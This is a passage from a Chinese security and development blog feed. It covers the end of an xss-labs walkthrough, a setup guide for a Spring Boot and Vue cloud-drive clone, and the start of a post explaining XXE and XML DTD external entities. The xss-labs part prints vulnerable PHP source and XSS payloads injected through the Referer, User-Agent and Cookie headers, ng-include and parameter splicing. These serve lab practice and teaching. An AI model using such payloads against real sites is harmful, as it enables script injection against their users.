type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>第四行明显是说Reffer</p>
<p>bp时</p>
<p><code>Referer:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520113437383.png" alt="image-20230520113437383"></p>
<h3 id="level12（代理）"><a href="#level12（代理）" class="headerlink" title="level12（代理）"></a>level12（代理）</h3><p>f12，看得t_ua</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>bp时，很明显是</p>
<p><code>User-Agent:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
<h3 id="level13-Cookie"><a href="#level13-Cookie" class="headerlink" title="level13(Cookie)"></a>level13(Cookie)</h3><p>f12，看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这应该提示了cookie</p>
<p>bp试试</p>
<p><code>Cookie: user=&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
<h3 id="level14-exif"><a href="#level14-exif" class="headerlink" title="level14(exif)"></a>level14(exif)</h3><p>待解决</p>
<h3 id="level15-ngInclude"><a href="#level15-ngInclude" class="headerlink" title="level15(ngInclude)"></a>level15(ngInclude)</h3><p>url:</p>
<p><code>http://localhost:81/xss-labs/level15.php?src=1.gif</code></p>
<p>f12出现这个：</p>
<p><img src="/../../../Typora/img111/image-20230520133632333.png" alt="image-20230520133632333"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>知识点：ng-include</p>
<p>ng-include是angular js的东西，类似php函数中的include函数，即包含文件。</p>
<p>1、ng-include 指令用于包含外部的 HTML文件。</p>
<p>2、包含的内容将作为指定元素的子节点。</p>
<p>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
<p>4、默认情况下，包含的文件需要包含在同一个域名下。</p>
<p>值得注意的是：</p>
<p>ng-include,如果单纯指定地址，必须要加引号</p>
<p>ng-include,加载外部html，script标签中的内容不执行</p>
<p>ng-include,加载外部html中含有style标签样式可以识别<br>参考：<a href="https://blog.csdn.net/RuoLi_s/article/details/112690177?ops_request_misc=&request_id=&biz_id=102&utm_term=xss-labs%E9%80%9A%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-112690177.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">xss-labs通关挑战（xss challenge）_RuoLi_s的博客-CSDN博客</a></p>
<p>把其他存在xss漏洞的文件包含进来。</p>
<p><code>src=&#39;level1.php?name=&lt;a href=javascript:alert(1)&gt;&#39;</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520135939252.png" alt="image-20230520135939252"></p>
<h3 id="level16-空格绕过"><a href="#level16-空格绕过" class="headerlink" title="level16(空格绕过)"></a>level16(空格绕过)</h3><p>源代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>主要是script替换了，空格实体化了，”&#x2F;“也没了</p>
<p>试试img，并且替换个空格</p>
<p>%0a试试。</p>
<p><code>keyword=</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520142552842.png" alt="image-20230520142552842"></p>
<h3 id="level17-18-参数拼接"><a href="#level17-18-参数拼接" class="headerlink" title="level17-18(参数拼接)"></a>level17-18(参数拼接)</h3><p>url两个参数，中间有&#x3D;</p>
<p><code>arg01=%20onmouseover&amp;arg02=alert(1)</code></p>
<p>onmouseover前加个空格</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520154125903.png" alt="image-20230520154125903"></p>
<p>level18同理。</p>
<h3 id="level19-20-Flash反编译"><a href="#level19-20-Flash反编译" class="headerlink" title="level19-20(Flash反编译)"></a>level19-20(Flash反编译)</h3><p>待解决</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>input标签的onmouseover</p>
]]></content>
      <categories>
        <category>xss</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>云盘项目</title>
    <url>/2023/08/14/yunpan%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h1 id="项目技术与功能"><a href="#项目技术与功能" class="headerlink" title="项目技术与功能"></a>项目技术与功能</h1><h1 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h1><ul>
<li>前端<ul>
<li>vue</li>
</ul>
</li>
<li>后端<ul>
<li>springboot</li>
<li>mysql</li>
<li>redis</li>
<li>ffmpeg</li>
</ul>
</li>
</ul>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>仿百度网盘</p>
<h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><p>mysql安装(我用的phpstudy自带的)</p>
<p>navicat(连接mysql的工具)</p>
<p><a href="https://wwur.lanzout.com/iD8Ow0ti96dg">redis</a>(安装后，服务默认自动)</p>
<p><a href="https://wwur.lanzout.com/iPS880tiblbg">Another-redis</a>(redis连接工具)</p>
<p><a href="https://wwur.lanzout.com/iORvc0tia6uj">ffmpeg</a>密码 9n15 </p>
<p><a href="https://wwur.lanzout.com/izom00ma0zqj">maven</a>配置（后端写java，需要装这个）密码1234</p>
<p><a href="https://wwur.lanzout.com/iGLTA0tpv6if">jrebel</a>(热部署工具)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;mirror&gt;</span><br><span class="line">      &lt;id&gt;alimaven&lt;/id&gt;  </span><br><span class="line">    &lt;name&gt;aliyun maven&lt;/name&gt;  </span><br><span class="line">    &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt; </span><br><span class="line">    &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">    &lt;/mirror&gt;</span><br></pre></td></tr></table></figure>

<p>然后配置其conf中settings.xml的阿里云镜像</p>
<p>(redis和ffmpeg、maven为了直接在dos上执行，而不用先跳转其路径再执行，用环境变量)</p>
<p>在系统变量的Path中添加Redis和ffmpeg&#x2F;bin、maven&#x2F;bin的路径</p>
<p>dos上执行 <code>ffmpeg -version</code>进行检测</p>
<p>dos上执行 <code>mvn -version</code>检测，如果出现JAVA_HOME之类的报错，请确认jdk是否在环境变量中，命名为JAVA_HOME</p>
<h1 id="项目构建"><a href="#项目构建" class="headerlink" title="项目构建"></a>项目构建</h1><h3 id="1-新建文件夹命名，用IDEA打开该工作空间"><a href="#1-新建文件夹命名，用IDEA打开该工作空间" class="headerlink" title="1.新建文件夹命名，用IDEA打开该工作空间"></a>1.新建文件夹命名，用IDEA打开该工作空间</h3><h3 id="2-配置jdk"><a href="#2-配置jdk" class="headerlink" title="2.配置jdk"></a>2.配置jdk</h3><p>fie-&gt;project struct</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230817195552313.png"></p>
<h3 id="3-maven设置"><a href="#3-maven设置" class="headerlink" title="3.maven设置"></a>3.maven设置</h3><p>setings搜索maven</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230817195715620.png"></p>
<p>file encoding设置为utf-8</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230817195815378.png"></p>
<h3 id="4-工程创建"><a href="#4-工程创建" class="headerlink" title="4.工程创建"></a>4.工程创建</h3><h4 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h4><p>选择工作空间，右键new-&gt;Module</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230817200027918.png"></p>
<p>方框中不推荐，其本质还是Maven，选择如上图的webapp</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230817200255837.png"></p>
<p>等待pom.xml依赖生成，如果有现成的pom.xml内容，可以先复制内容到word，再复制到文件中(目的是解决格式问题)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是些project、dependency等玩意儿</span><br></pre></td></tr></table></figure>



<h4 id="application-properties"><a href="#application-properties" class="headerlink" title="application.properties"></a>application.properties</h4><p>main文件夹中删除其他文件夹，添加java与resouces文件夹，如果没有自动识别</p>
<p>File-&gt;project struct-&gt;Module-&gt;Sources，对相应文件夹标记即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230817215620968.png"></p>
<p>在java资源下添加包<code>com.easypan</code>，包中添加类；resources下添加 application.properties文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里就是些web端口配置啊，日志啊，邮件啊之类的</span><br></pre></td></tr></table></figure>

<p>然后数据库的url由于是easypan?…</p>
<p>那么数据库就要建立一个easypan</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230817224137160.png"></p>
<h4 id="logback-spring-xml"><a href="#logback-spring-xml" class="headerlink" title="logback-spring.xml"></a>logback-spring.xml</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">日志的配置</span><br></pre></td></tr></table></figure>



<p>把JetBrains\IntelliJ IDEA 2020.1.2\bin中的idea.properties内容改下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idea.config.path=C:/Program Files/JetBrains/.IntelliJ IDEA 2020.1.2/config</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line"># Uncomment this option if you want to customize path to IDE system folder. Make sure you&#x27;re using forward slashes.</span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line">idea.system.path=C:/Program Files/JetBrains/.IntelliJ IDEA 2020.1.2/system</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line"># Uncomment this option if you want to customize path to user installed plugins folder. Make sure you&#x27;re using forward slashes.</span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line">idea.plugins.path=C:/Program Files/JetBrains/.IntelliJ IDEA 2020.1.2/plugins</span><br></pre></td></tr></table></figure>

<p>重新启动idea，即可使用</p>
<p>之后是激活jrebel</p>
<p>对入口类进行jrebel debug运行</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230818150051246.png" alt="目前项目构造"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230818145910815.png"></p>
<h1 id="登录注册"><a href="#登录注册" class="headerlink" title="登录注册"></a>登录注册</h1><h2 id="1-数据库设计"><a href="#1-数据库设计" class="headerlink" title="1.数据库设计"></a>1.数据库设计</h2><p>在navicat工具中去新建表，然后给表进行注释，并添加对应的列，进行相应注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `user_info` (</span><br><span class="line">  `user_id` varchar(15) NOT NULL COMMENT &#x27;用户ID&#x27;,</span><br><span class="line">  `nick_name` varchar(20) DEFAULT NULL COMMENT &#x27;昵称&#x27;,</span><br><span class="line">  `email` varchar(150) DEFAULT NULL COMMENT &#x27;邮箱&#x27;,</span><br><span class="line">  `qq_open_id` varchar(35) DEFAULT NULL COMMENT &#x27;qqid&#x27;,</span><br><span class="line">  `qq_image` varchar(150) DEFAULT NULL COMMENT &#x27;qq头像&#x27;,</span><br><span class="line">  `password` varchar(32) DEFAULT NULL COMMENT &#x27;密码&#x27;,</span><br><span class="line">  `join_time` datetime DEFAULT NULL COMMENT &#x27;创建时间&#x27;,</span><br><span class="line">  `last_login_time` datetime DEFAULT NULL COMMENT &#x27;最近登录时间&#x27;,</span><br><span class="line">  `status` tinyint(1) DEFAULT NULL COMMENT &#x27;0:禁用,1:启用&#x27;,</span><br><span class="line">  `use_space` bigint(20) DEFAULT NULL COMMENT &#x27;云盘使用空间，单位byte&#x27;,</span><br><span class="line">  `total_space` bigint(20) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`user_id`)</span><br><span class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COMMENT=&#x27;用户信息&#x27;;</span><br></pre></td></tr></table></figure>

<p>再把索引建立一下</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230818154202117.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `user_info` (</span><br><span class="line">  `user_id` varchar(15) NOT NULL COMMENT &#x27;用户ID&#x27;,</span><br><span class="line">  `nick_name` varchar(20) DEFAULT NULL COMMENT &#x27;昵称&#x27;,</span><br><span class="line">  `email` varchar(150) DEFAULT NULL COMMENT &#x27;邮箱&#x27;,</span><br><span class="line">  `qq_open_id` varchar(35) DEFAULT NULL COMMENT &#x27;qqid&#x27;,</span><br><span class="line">  `qq_image` varchar(150) DEFAULT NULL COMMENT &#x27;qq头像&#x27;,</span><br><span class="line">  `password` varchar(32) DEFAULT NULL COMMENT &#x27;密码&#x27;,</span><br><span class="line">  `join_time` datetime DEFAULT NULL COMMENT &#x27;创建时间&#x27;,</span><br><span class="line">  `last_login_time` datetime DEFAULT NULL COMMENT &#x27;最近登录时间&#x27;,</span><br><span class="line">  `status` tinyint(1) DEFAULT NULL COMMENT &#x27;0:禁用,1:启用&#x27;,</span><br><span class="line">  `use_space` bigint(20) DEFAULT NULL COMMENT &#x27;云盘使用空间，单位byte&#x27;,</span><br><span class="line">  `total_space` bigint(20) DEFAULT NULL COMMENT &#x27;总空间&#x27;,</span><br><span class="line">  PRIMARY KEY (`user_id`),</span><br><span class="line">  UNIQUE KEY `key_email` (`email`),</span><br><span class="line">  UNIQUE KEY `key_qq_open_id` (`qq_open_id`),</span><br><span class="line">  UNIQUE KEY `key_nick_name` (`nick_name`)</span><br><span class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COMMENT=&#x27;用户信息&#x27;;</span><br></pre></td></tr></table></figure>

<p>之后貌似就涉及到了，如何用IDEA去实现<strong>根据表内容自动生成实体类</strong>了</p>
<p>B站 <a href="https://www.bilibili.com/video/BV1EN4y1c7sL?p=3&vd_source=c49e37118f69c7a5b34915b73d1b78ab">老罗</a></p>
<p>CSDN <a href="http://t.csdn.cn/1TDDt">二木成林</a></p>
<p>CSDN <a href="http://t.csdn.cn/C0jtX">新晨Zeng</a>（是一种方法参考，但没有用这个）</p>
<h3 id="自动设计类"><a href="#自动设计类" class="headerlink" title="自动设计类"></a>自动设计类</h3><p>首先，navicat写好了表，且对每一列注释好，对表名也有注释</p>
<p>IDEA，去利用自带的database工具进行连接mysql，（先安装相应driver），再连接对应数据库</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230818205450585.png"></p>
<p>在pom.xml中引入依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--mybatis--&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;$&#123;mybatis.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>下载easycode插件去自动生成代码</p>
<p>CSDN <a href="http://t.csdn.cn/tggmc">ShaneHolmes</a>（我看的这个）</p>
<p>CSDN <a href="http://t.csdn.cn/Q3hAX">Darren Gong</a>（maven依赖和application.properties参考这个）</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230818211324027.png"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230818211538456.png"></p>
<p>为了加注解的话</p>
<p>往application.properties加入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">############## Mybatis ##############</span><br><span class="line">mybatis.mapper-locations=classpath:mapper/*Dao.xml</span><br><span class="line">mybatis.type-aliases-package=com.easypan.entity</span><br></pre></td></tr></table></figure>

<p>Dao层上加入 <code>@Mapper</code></p>
<p>启动类上加入<code>@MapperScan(&quot;com.easypan.dao&quot;)</code></p>
<p>插入一行数据后，jrebel debug启动类，访问得</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230818221155117.png"></p>
<h2 id="2-部署前端"><a href="#2-部署前端" class="headerlink" title="2.部署前端"></a>2.部署前端</h2><h3 id="下载nginx"><a href="#下载nginx" class="headerlink" title="下载nginx"></a>下载nginx</h3><p>我之前练习注入靶场的时候，下载了小皮phpstudy，我就用它自带的nginx吧</p>
<h3 id="下载前端编译程序"><a href="#下载前端编译程序" class="headerlink" title="下载前端编译程序"></a>下载前端编译程序</h3><h3 id="编译nginx"><a href="#编译nginx" class="headerlink" title="编译nginx"></a>编译nginx</h3><p>更改nginx的nginx.conf配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  server &#123;</span><br><span class="line">      listen       8000;#访问端口</span><br><span class="line">      #listen       somename:8080;</span><br><span class="line">      server_name  easypan.yuleiyun.com;</span><br><span class="line">charset utf-8;</span><br><span class="line"></span><br><span class="line">      location / &#123;  #路由规则</span><br><span class="line">	alias  D:/phpstudy_pro/WWW/sqli/; #将代码项目build后放进sqli 真实静态资源的路径</span><br><span class="line">          #root   html; #root 以location块名称为文件夹下的路径</span><br><span class="line">          # root 和 alias 取其1即可</span><br><span class="line">          </span><br><span class="line">          index  index.html index.htm; #index 首页设置</span><br><span class="line">      &#125;</span><br><span class="line">location /api &#123;</span><br><span class="line">	#alias </span><br><span class="line">          proxy_pass http://localhost:7090/api;# 跨域访问</span><br><span class="line">	proxy_set_header x-forwarded-for $remote_addr;#客户端ip remote_addr</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>关于那个<code>server_name  easypan.yuleiyun.com</code>；</p>
<p>可以下载一个工具switchHost，用来对<strong>127.0.0.1 easypan.yuleiyun.com</strong>的映射</p>
<p><img src="/../../../Typora/img111/image-20230819122440494.png" alt="更改host映射"></p>
<p><img src="/../../../Typora/img111/image-20230819113900493.png" alt="image-20230819113900493"></p>
<p>关于配置文件的详解，参考 CSDN <a href="http://t.csdn.cn/z1KEm">皮卡丘的猫</a>，以及<a href="http://t.csdn.cn/zEQwv">另一条</a></p>
<p>在nginx所在文件夹，shift+鼠标右键，启动powershell</p>
<p><code>start .\nginx.exe</code> 启动</p>
<p> <code>.\nginx.exe -s reload</code> 每修改一次conf，执行一次</p>
<p><code>.\nginx.exe -s stop</code> &#x2F;&#x2F;停止</p>
<p><img src="/../../../Typora/img111/image-20230819123842755.png" alt="访问得"></p>
<p><strong>D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;sqli&#x2F;目录下肯定有一个html或htm文件的</strong></p>
<p>CSDN <a href="http://t.csdn.cn/I17OW">普通网友</a></p>
<h2 id="3-前端转战vs-code"><a href="#3-前端转战vs-code" class="headerlink" title="3.前端转战vs code"></a>3.前端转战vs code</h2><p>先构建项目，下载<a href="https://nodejs.org/download/release/v16.20.0/">node.js</a></p>
<p>此处为v16.17.0版本</p>
<p>我之前下过node，cmd输入where node，找到路径，删掉，下载对应版本node，添加环境变量即可</p>
<p>(题外话)：删除了原版本的node后，在git中用hexo更新博客，发现没有该命令了，只能重新<code>npm install -g hexo-cli</code>了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\myworkspace_front&gt; node -v</span><br><span class="line">v16.17.0</span><br><span class="line">PS E:\myworkspace_front&gt; npm config get registry</span><br><span class="line">https://registry.npm.taobao.org/</span><br><span class="line">PS E:\myworkspace_front&gt; npm config set registry https://registry.npmmirror.com</span><br><span class="line">PS E:\myworkspace_front&gt; npm init vite@latest easypan-front</span><br><span class="line">Need to install the following packages:</span><br><span class="line">  create-vite@4.4.1</span><br><span class="line">Ok to proceed? (y)</span><br><span class="line">√ Select a framework: » Vue</span><br><span class="line">√ Select a variant: » Customize with create-vue ↗</span><br><span class="line">Need to install the following packages:</span><br><span class="line">  create-vue@3.7.2</span><br><span class="line">Ok to proceed? (y) y</span><br><span class="line"></span><br><span class="line">//构建项目</span><br><span class="line">PS E:\myworkspace_front&gt; npm init vite@latest easypan-front</span><br><span class="line">√ Select a framework: » Vue</span><br><span class="line">√ Select a variant: » Customize with create-vue ↗</span><br><span class="line"></span><br><span class="line">Vue.js - The Progressive JavaScript Framework</span><br><span class="line"></span><br><span class="line">√ Add TypeScript? ... No</span><br><span class="line">√ Add JSX Support? ... No</span><br><span class="line">√ Add Vue Router for Single Page Application development? ...  Yes</span><br><span class="line">√ Add Vitest for Unit Testing? ... No </span><br><span class="line">√ Add an End-to-End Testing Solution? » No</span><br><span class="line">√ Add ESLint for code quality? ... No </span><br><span class="line"></span><br><span class="line">Scaffolding project in E:\myworkspace_front\easypan-front...</span><br><span class="line"></span><br><span class="line">Done. Now run:</span><br><span class="line"></span><br><span class="line">  cd easypan-front</span><br><span class="line">  npm install</span><br><span class="line">  npm run dev</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//安装项目依赖</span><br><span class="line">PS E:\myworkspace_front&gt; cd .\easypan-front\</span><br><span class="line">PS E:\myworkspace_front\easypan-front&gt; </span><br><span class="line">npm install @highlightjs/vue-plugin @moefe/vue-aplayer aplayer axios docx-preview dplayer element-plus highlight.js hls.js js-md5 sass sass-loader spark-md5 vue-clipboard3 vue-cookies vue-pdf-embed vue-router vue3-pdfjs xlsx --save</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到文件夹</p>
<p><img src="/../../../Typora/img111/image-20230819233243788.png"></p>
<p>之后<code>npm run dev</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">VITE v4.4.9  ready in 3323 ms</span><br><span class="line"></span><br><span class="line">➜  Local:   http://127.0.0.1:5173/</span><br><span class="line">➜  Network: use --host to expose</span><br><span class="line">➜  press h to show help</span><br></pre></td></tr></table></figure>

<p>对vite.config.js进行修改，可以自定义端口，不用5173</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  server:&#123;</span><br><span class="line">    port:1079,</span><br><span class="line">    hmr:true,</span><br><span class="line">    proxy:&#123;</span><br><span class="line">      &quot;/api&quot;:&#123;</span><br><span class="line">        target:&quot;http://localhost:7090&quot;,</span><br><span class="line">        changeOrigin:true,</span><br><span class="line">        pathRewrite:&#123;</span><br><span class="line">          &quot;^api&quot;:&quot;/api&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>访问127.0.0.1:1079</p>
<p><img src="/../../../Typora/img111/image-20230819233857781.png" alt="访问前端"></p>
]]></content>
      <categories>
        <category>java web</category>
        <category>springboot</category>
        <category>vue3</category>
      </categories>
      <tags>
        <tag>java web</tag>
        <tag>spring_boot</tag>
        <tag>vue3</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe与xml</title>
    <url>/2023/05/30/xxe%E4%B8%8Exml/</url>
    <content><![CDATA[<h3 id="1-参考"><a href="#1-参考" class="headerlink" title="1.参考"></a>1.参考</h3><p><a href="https://xz.aliyun.com/t/12325">对于XXE的理解 - 先知社区 (aliyun.com)</a></p>
<p><a href="http://t.csdn.cn/zUo5a">http://t.csdn.cn/zUo5a</a></p>
<h3 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2.前置知识"></a>2.前置知识</h3><p>xml被设计为<strong>传输和存储数据</strong>，xml文档结构包括：</p>
<p>xml声明</p>
<p>DTD文档类型定义(漏洞所在之处)</p>
<p>文档元素</p>
<p>焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
<p>xxe（xml external entity injection），即xml外部实体注入漏洞，xxe漏洞发生在应用程序解析xml输入时，<strong>没有禁止外部实体的加载</strong>，导致加载了恶意外部文件，造成文件读取、命令执行、内网攻击、DOS攻击等危害。</p>
<h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>没有禁止外部实体解析</p>
<h4 id="xml与html主要差异"><a href="#xml与html主要差异" class="headerlink" title="xml与html主要差异"></a>xml与html主要差异</h4><p>xml被设计为传输和存储数据，焦点是数据的内容；</p>
<p>html被设计用来显示数据，焦点是数据的外观；</p>
<p>html旨在显示信息，而xml旨在传输信息。</p>
<h4 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">第一部分：XML声明部分</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"> </span><br><span class="line">第二部分：文档类型定义 DTD</span><br><span class="line"><span class="comment">&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[ </span></span><br><span class="line"><span class="meta">  &lt;!--定义 note 元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  &lt;!--定义 to 元素为 &quot;#PCDATA&quot; 类型--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;!-- 形如: <span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span> --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">entity-name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;URI/URL&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> </span><br><span class="line">第三部分：文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line">————————————————</span><br><span 